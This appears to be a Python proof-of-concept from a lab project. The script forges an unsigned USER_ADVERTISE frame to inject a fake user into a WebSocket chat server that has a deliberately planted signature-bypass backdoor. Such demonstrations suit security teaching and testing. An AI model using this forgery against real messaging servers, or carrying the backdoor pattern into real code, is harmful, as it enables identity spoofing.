#!/usr/bin/env python3
"""
PoC: inject an unsigned USER_ADVERTISE (server gossip) to a server.

Precondition:
- Your vulnerable server must be running with BACKDOOR_TRUST_GOSSIP=1
  (the backdoor in server.py that accepts unsigned USER_ADVERTISE frames).

Usage:
  python3 quarantine/poc_inject_unsigned_advert.py --host 127.0.0.1 --port 8765

What it does:
- Connects to the target server as a raw WebSocket client
- Sends a USER_ADVERTISE JSON frame with no "sig" (or an invalid sig)
- Observes if the server accepts and logs the advert (server logs will show [BACKDOOR] accepting...)
"""

import asyncio
import argparse
import json
import uuid
import base64
import time
from websockets import connect

def b64url_encode(data: bytes) -> str:
    enc = base64.urlsafe_b64encode(data).rstrip(b"=")
    return enc.decode("ascii")

async def send_unsigned_advert(host, port, fake_user_id=None, fake_server_id=None):
    uri = f"ws://{host}:{port}"
    if fake_user_id is None:
        fake_user_id = str(uuid.uuid4())
    if fake_server_id is None:
        # This is an attacker-controlled server_id string (not pinned)
        fake_server_id = str(uuid.uuid4())

    # Minimal fake pubkey: to be accepted, the server's backdoor must bypass verification
    # We'll include a dummy short DER blob base64url (server accepts it because it is a demo)
    dummy_pub_der = b64url_encode(b"0DER-DATA-SAMPLE")

    payload = {
        "user_id": fake_user_id,
        "server_id": fake_server_id,
        "meta": {"name": "poc_injected_user"},
        "pubkey": dummy_pub_der,
    }

    advert = {
        "type": "USER_ADVERTISE",
        "from": fake_server_id,
        "to": "*",
        "id": uuid.uuid4().hex,
        "ts": int(time.time() * 1000),
        "payload": payload,
        # NOTE: intentionally omit "sig" to simulate an unsigned advert
    }

    print("Connecting to", uri)
    try:
        async with connect(uri) as ws:
            print("Connected. Sending unsigned USER_ADVERTISE...")
            await ws.send(json.dumps(advert))
            # Wait briefly for any server responses / errors
            try:
                raw = await asyncio.wait_for(ws.recv(), timeout=3)
                print("<< received:", raw)
            except asyncio.TimeoutError:
                print("No immediate reply (server may accept and forward silently). Check server logs for [BACKDOOR] message.")
    except Exception as e:
        print("Connection failed:", e)

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", default=8765, type=int)
    p.add_argument("--user", default=None)
    p.add_argument("--server", default=None)
    args = p.parse_args()
    asyncio.run(send_unsigned_advert(args.host, args.port, args.user, args.server))
